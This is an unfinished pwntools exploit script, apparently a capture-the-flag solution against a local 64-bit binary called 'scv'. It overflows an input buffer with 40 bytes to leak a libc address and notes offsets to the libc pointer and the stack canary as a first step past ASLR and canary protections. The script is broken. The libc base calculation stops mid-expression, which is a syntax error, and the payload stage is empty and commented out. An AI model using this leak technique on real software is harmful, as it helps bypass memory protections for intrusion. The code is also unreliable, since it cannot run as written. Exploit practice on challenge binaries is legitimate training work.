#!/usr/bin/env python

#notes
#64 bit
#Canary and aslr
#You need to leak libc address

from pwn import *

context.binary = './scv'
conn = process('./scv')
libc = ELF('libc-2.23.so')

#+--------------------LEAK LIBC----------------------+
#$rsi + 40d = libc
#$rsi + 168d = canary
junk_fill = ''

conn.recvuntil('>>')
conn.sendline('1')
conn.recvuntil('>>')

junk_fill += "A"*40
conn.sendline(junk_fill)
conn.recvuntil('>>')
conn.sendline('2')

#grabs output
'''
You input "A"*40 and then when you press the enter key --> \n
so the input buffer looks like AAAAA\n
When its output it also folllows that format so you can delimit
Because we know we overflowed the address up to the libc addr
we know the next address for X number bytes is that
also the end of the address space has null bytes so it ends there
'''
leaked_addr = conn.recvuntil('>>').split('\n')[6][:6]

#leaked_addr = unpack(leaked_addr, 'all', endian='little', sign=False)
leaked_addr = unpack(leaked_addr, 'all', endian='little', sign=False)

#Calculate offset
#0x00007ffffecda299 - given base address
libc_base = leaked_addr - 
print('CALCULATED OFFSET --> ')
#+---------------------------------------------------+



'''
payload = ''

conn.sendline(payload)

conn.interactive()
'''